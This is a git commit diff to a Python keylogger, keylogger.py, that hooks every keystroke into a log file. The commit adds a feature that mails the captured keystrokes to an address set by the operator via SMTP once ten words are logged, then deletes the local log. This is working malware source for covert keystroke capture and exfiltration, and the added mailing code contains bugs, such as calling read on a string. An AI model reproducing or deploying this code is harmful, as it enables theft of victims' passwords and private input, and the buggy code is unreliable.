05db3893b55cc25ebe37d6ad1bb6d605464fb961
Niylaina <rajoeliarijery.andrianina@gmail.com>
2018-06-11 14:37:19 +0300

    add mail feature

--- keylogger.py
+++ keylogger.py
@@ -1,11 +1,13 @@
 #!/usr/bin/env python
 import os
 import pyxhook
+import smtplib
+from email.mime.text import MIMEText
 
 # location of the log file
 log_file = os.environ.get(
     'pylogger_file',
-    os.path.expanduser('~/file.log')
+    os.path.expanduser('file.log')
 )
 
 # Allow setting the cancel key (ctrl + c sometimes doesn't work)
@@ -27,16 +29,33 @@ if os.environ.get('pylogger_clean', None) is not None:
 
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
-	if event.Key == 'space': 
-		f.write(' ')
-	elif event.Key == 'Return':
-		f.write('\n')
-	elif event.Key == 'BackSpace':
-		f.write('\n{}\n'.format(event.Key))
-	else:
-		f.write('{}'.format(event.Key))
+        if event.Key == 'space': 
+            f.write(' ')
+        elif event.Key == 'Return':
+            f.write('\n')
+        elif event.Key == 'BackSpace':
+            f.write('\n{}\n'.format(event.Key))
+        else:
+            f.write('{}'.format(event.Key))
     if event.Ascii == cancel_key:
         new_hook.cancel()
+    log = open('file.log', 'r').read()
+    count = len(log.split())
+    if count >= 10:
+    #try to send the mail every 10 words typed
+        From = 'whatever@NOT_GMAIL.com' 
+        To = 'your mail'
+        msg = MIMEText(log.read())
+        #if sending to gmail, check your spam box
+        s = smtplib.SMTP('localhost')
+        #or use your own smtp server
+        try:
+            s.sendmail(From, To, msg)
+            s.quit()
+            os.remove('file.log')
+            pass
+        except:
+            pass
 
 
 new_hook = pyxhook.HookManager()
